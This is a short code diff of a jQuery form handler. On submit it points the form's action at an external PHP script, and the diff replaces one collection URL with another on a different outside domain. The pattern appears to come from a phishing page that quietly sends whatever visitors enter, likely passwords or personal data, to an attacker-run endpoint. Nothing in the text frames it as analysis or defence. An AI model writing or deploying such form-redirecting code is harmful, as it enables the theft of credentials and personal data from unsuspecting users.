@@ -1,3 +1,3 @@
 $("form").submit(function() {
-  $(myform).attr("action", "https://kawasaki-empattak-duaribuduaempat.000webhostapp.com/zx/juri.php");
+  $(myform).attr("action", "https://awalyearbagus.my.id/konglomerat/gatot.php");
 });
